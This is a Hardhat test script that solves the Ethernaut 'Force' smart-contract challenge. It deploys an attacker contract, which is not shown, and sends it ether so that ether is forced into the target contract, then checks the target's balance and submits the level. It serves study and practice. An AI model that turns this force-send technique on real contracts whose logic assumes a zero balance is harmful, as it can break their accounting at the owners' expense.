import { expect } from "chai";
import { BigNumber, Contract, Signer } from "ethers";
import { ethers } from "hardhat";
import { createChallenge, submitLevel } from "./utils";
import { loadFixture } from "@nomicfoundation/hardhat-network-helpers";

let accounts: Signer[];
let eoa: Signer;
let attacker: Contract;
let challenge: Contract; // challenge contract
let tx: any;

describe("Force", function () {

    async function deployTokenFixture(): Promise<any> {
        accounts = await ethers.getSigners();
        [eoa] = accounts;
        const challengeFactory = await ethers.getContractFactory(`Force`);
        const challengeAddress = await createChallenge(
            `0x46f79002907a025599f355A04A512A6Fd45E671B`
        );
        challenge = await challengeFactory.attach(challengeAddress);

        const attackerFactory = await ethers.getContractFactory(`ForceAttack`);
        attacker = await attackerFactory.deploy(challenge.address);

        return { eoa, challenge, attacker };
    }

    it("solves the challenge", async function () {
        const { eoa, challenge, attacker } = await loadFixture(deployTokenFixture);

        try {
            const tx = await eoa.sendTransaction({
                to: attacker.address,
                value: ethers.utils.parseEther("1.0")
            });

            const receipt = await tx.wait();
            // console.log({receipt});
        } catch (err) {
            console.log("error: " + err);
        }

        console.log("challenge balance: " + await eoa.provider.getBalance(await challenge.address));

        expect(await eoa.provider.getBalance(await challenge.address)).to.greaterThan(0, "level not solved");

    });

    after(async () => {
        expect(await submitLevel(challenge.address), "level not solved").to.be.true;
    });
});
